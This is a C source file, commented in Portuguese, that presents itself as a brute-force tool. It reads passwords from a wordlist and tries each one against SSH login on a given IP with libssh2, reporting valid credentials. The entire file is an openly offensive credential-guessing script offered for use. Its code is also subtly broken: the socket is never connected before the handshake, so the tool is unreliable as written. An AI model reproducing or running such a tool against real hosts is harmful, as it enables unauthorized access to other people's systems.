#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <libssh2.h>

//Ferramenta de força bruta para serviços de autenticação.

#define BUFFER_SIZE 1024

void try_login(const char *ip, const char *username, const char *password) {
    LIBSSH2_SESSION *session;
    int rc;
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(22);
    inet_pton(AF_INET, ip, &sin.sin_addr);

    session = libssh2_session_init();
    if (libssh2_session_handshake(session, socket(AF_INET, SOCK_STREAM, 0)) != 0) {
        libssh2_session_free(session);
        return;
    }

    if (libssh2_userauth_password(session, username, password) == 0) {
        printf("Found valid login: %s / %s\n", username, password);
    }

    libssh2_session_disconnect(session, "Normal Shutdown");
    libssh2_session_free(session);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Uso: %s <IP> <usuario> <arquivo de senhas>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];
    const char *username = argv[2];
    const char *password_file = argv[3];
    FILE *file = fopen(password_file, "r");

    if (!file) {
        perror("fopen");
        return 1;
    }

    char password[BUFFER_SIZE];
    while (fgets(password, sizeof(password), file)) {
        password[strcspn(password, "\n")] = 0;
        try_login(ip, username, password);
    }

    fclose(file);
    return 0;
}
